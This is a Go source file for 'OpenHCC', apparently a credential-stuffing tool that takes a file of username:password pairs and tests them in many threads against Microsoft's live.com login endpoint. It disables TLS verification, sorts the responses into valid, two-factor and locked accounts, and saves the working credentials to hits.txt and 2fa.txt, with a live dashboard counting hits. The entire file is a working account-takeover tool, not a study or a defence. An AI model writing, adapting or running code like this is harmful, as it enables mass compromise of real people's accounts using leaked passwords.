package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// --- Stats & Global State ---
var (
	hits      int64
	bad       int64
	twoFactor int64
	locked    int64
	checked   int64
	errors    int64
	total     int64
	startTime time.Time
	feed      []string
	feedLock  sync.Mutex
)

const (
	W         = 66
	FeedSize  = 7
	Reset     = "\033[0m"
	Bold      = "\033[1m"
	CBorder   = "\033[38;2;40;60;90m"
	CBorder2  = "\033[38;2;0;190;215m"
	CLabel    = "\033[38;2;90;130;170m"
	CValue    = "\033[38;2;220;240;255m"
	CValid    = "\033[38;2;0;230;120m"
	CDead     = "\033[38;2;230;60;60m"
	CWarn     = "\033[38;2;255;185;0m"
	CAccent   = "\033[38;2;0;210;255m"
	CDim      = "\033[38;2;50;70;90m"
	VERSION   = "1.0.0"
)

var asciiLogo = []string{
` ______   ______  ______   __   __    __  __   ______   ______    `,
`/\  __ \ /\  == \/\  ___\ /\ "-.\ \  /\ \_\ \ /\  ___\ /\  ___\   `,
`\ \ \/\ \\ \  _-/\ \  __\ \ \ \-.  \ \ \  __ \\ \ \____\ \ \____  `,
` \ \_____\\ \_\   \ \_____\\ \_\\"\_\ \ \_\ \_\\ \_____\\ \_____\ `,
`  \/_____/ \/_/    \/_____/ \/_/ \/_/  \/_/\/_/ \/_____/ \/_____/ `,
}

// -- GETVersion --
func getVersion() string {
	resp, err := http.Get("https://raw.githubusercontent.com/ft7x/OpenHCC/refs/heads/main/version.txt")
	if err != nil {
		return VERSION
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return VERSION
	}

	return strings.TrimSpace(string(body))
}

// -- Check Version --
func checkVer() {
	latestVer := getVersion()
	
	if latestVer != VERSION {
		fmt.Printf("\n%s[UPDATE]%s New Version Available! Your version: %s | New: %s\n", CWarn, Reset, VERSION, latestVer)
		fmt.Printf("%s[GITHUB]%s Download latest: github.com/ft7x/OpenHCC\n\n", CAccent, Reset)
		time.Sleep(2 * time.Second)
	} else {
	  fmt.Printf("%s[i]%s Your version is up-to date!\n\n", CAccent, Reset)
	}
}

// --- UI Helpers ---

func clear() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		fmt.Print("\033[H\033[2J")
	}
}

func hline(char string, color string) string {
	return color + strings.Repeat(char, W) + Reset
}

func boxLine(content string, lc string, rc string) string {
	plainLen := len(stripAnsi(content))
	spaces := W - 2 - 2 - plainLen
	if spaces < 0 {
		spaces = 0
	}
	return lc + "│ " + Reset + content + strings.Repeat(" ", spaces) + " " + rc + "│" + Reset
}

func stripAnsi(str string) string {
	// Simple stripper for layout calculations
	return strings.NewReplacer(
		CBorder, "", CBorder2, "", CLabel, "", CValue, "",
		CValid, "", CDead, "", CWarn, "", CAccent, "",
		CDim, "", Reset, "", Bold, "",
	).Replace(str)
}

func pushFeed(msg string) {
	feedLock.Lock()
	defer feedLock.Unlock()
	feed = append(feed, msg)
	if len(feed) > FeedSize {
		feed = feed[1:]
	}
}

func renderBanner() {
	for _, line := range asciiLogo {
		fmt.Printf("%s%s%s\n", CAccent, line, Reset)
	}
	fmt.Printf("\n%s\n\n", centerText("OpenHCC | dev: @zft77", W))
}

func centerText(s string, width int) string {
	pad := (width - len(s)) / 2
	if pad < 0 {
		return s
	}
	return strings.Repeat(" ", pad) + s
}

func dashboard() {
	for {
		time.Sleep(200 * time.Millisecond)
		elapsed := time.Since(startTime).Seconds()
		checkedVal := atomic.LoadInt64(&checked)
		cpm := float64(checkedVal) / (elapsed / 60)
		if elapsed < 1 {
			cpm = 0
		}

		pct := 0.0
		if total > 0 {
			pct = float64(checkedVal) / float64(total) * 100
		}

		fmt.Print("\033[H") // Move cursor to top
		renderBanner()
		fmt.Println(hline("═", CBorder2))
		fmt.Println(boxLine(fmt.Sprintf("%sPROGRESS: %s%.1f%% %s(%d/%d)", CLabel, CValue, pct, CLabel, checkedVal, total), CBorder2, CBorder2))
		fmt.Println(boxLine(fmt.Sprintf("%sCPM:      %s%.0f", CLabel, CValue, cpm), CBorder2, CBorder2))
		fmt.Println(hline("─", CBorder))
		fmt.Println(boxLine(fmt.Sprintf("%sHITS: %s%d  %s|  2FA: %s%d  %s|  LOCKED: %s%d  %s|  ERR: %s%d", CLabel, CValid, atomic.LoadInt64(&hits), CLabel, CWarn, atomic.LoadInt64(&twoFactor), CLabel, CDead, atomic.LoadInt64(&locked), CLabel, CDead, atomic.LoadInt64(&errors)), CBorder2, CBorder2))
		fmt.Println(hline("─", CBorder))
		fmt.Println(boxLine(CAccent+" ▸ LIVE FEED", CBorder2, CBorder2))

		feedLock.Lock()
		for i := 0; i < FeedSize; i++ {
			if i < len(feed) {
				fmt.Println(boxLine(feed[i], CBorder2, CBorder2))
			} else {
				fmt.Println(boxLine("", CBorder2, CBorder2))
			}
		}
		feedLock.Unlock()
		fmt.Println(hline("═", CBorder2))
	}
}

// --- Core Logic ---

func main() {
	clear()
	renderBanner()
  checkVer()
  
	var comboPath string
	var threads int

	fmt.Printf("%s[INPUT]%s Enter combo path: ", CAccent, Reset)
	fmt.Scanln(&comboPath)
	fmt.Printf("%s[INPUT]%s Enter threads: ", CAccent, Reset)
	fmt.Scanln(&threads)

	file, err := os.Open(comboPath)
	if err != nil {
		fmt.Printf("%sError: %v%s\n", CDead, err, Reset)
		return
	}
	defer file.Close()

	// Pre-scan for total
	ts := bufio.NewScanner(file)
	for ts.Scan() {
		total++
	}
	file.Seek(0, 0)

	startTime = time.Now()
	jobs := make(chan string, threads*2)
	var wg sync.WaitGroup

	clear()
	go dashboard()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	scanner := bufio.NewScanner(file)
	buf := make([]byte, 0, 1024*1024)
	scanner.Buffer(buf, 1024*1024)

	for scanner.Scan() {
		jobs <- scanner.Text()
	}

	close(jobs)
	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Printf("\n%sFinished. Results saved to hits.txt and 2fa.txt%s\n", CValid, Reset)
}

func worker(jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			DisableCompression:  true,
		},
	}

	for line := range jobs {
		parts := strings.Split(line, ":")
		if len(parts) < 2 {
			atomic.AddInt64(&checked, 1)
			continue
		}
		processAccount(client, parts[0], parts[1])
		atomic.AddInt64(&checked, 1)
	}
}

func processAccount(client *http.Client, user, pass string) {
	data := url.Values{}
	data.Set("login", user)
	data.Set("loginfmt", user)
	data.Set("passwd", pass)
	data.Set("PPFT", "-Dv8FsdYukJTVG33u!rX2gafw8pMc0Hveyxi6M3iuALxhtRtzT1rKMfsId*bk!QqnycgvC3sILE1I8f7OOC53!b1sGqL6CBu3STxzSq2vhOLYmH8aiGacTB3Q7lidVZWvP8OG9RL7Cw2FyrhKVcRv37Z8sTJ*86QlKdV4SmvgwyFNSSZXrVxumisMYvUycOXoErKvBF7lc2QNGKLDbN7m5ngkUfS67XuSQxfotxGq*wZZPMZr6BSPpDErGdbdc3agsw$$")

	req, _ := http.NewRequest("POST", "https://login.live.com/ppsecure/post.srf", strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&errors, 1)
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 50*1024))
	body := string(bodyBytes)
	location := resp.Header.Get("Location")

	switch {
	case strings.Contains(body, "https://logincdn.msftauth.net/") || strings.Contains(location, "oauth20_desktop"):
		saveHit("hits.txt", user, pass)
		atomic.AddInt64(&hits, 1)
		pushFeed(fmt.Sprintf("%s✔ HIT: %s%s", CValid, CValue, user))

	case strings.Contains(body, "recover?mkt") || strings.Contains(body, "identity/confirm"):
		saveHit("2fa.txt", user, pass)
		atomic.AddInt64(&twoFactor, 1)
		pushFeed(fmt.Sprintf("%s⚠ 2FA: %s%s", CWarn, CValue, user))

	case strings.Contains(body, "/Abuse?mkt="):
		atomic.AddInt64(&locked, 1)
		pushFeed(fmt.Sprintf("%s✘ LCK: %s%s", CDead, CValue, user))

	default:
		atomic.AddInt64(&bad, 1)
	}
}

func saveHit(filename, user, pass string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(fmt.Sprintf("%s:%s\n", user, pass))
}
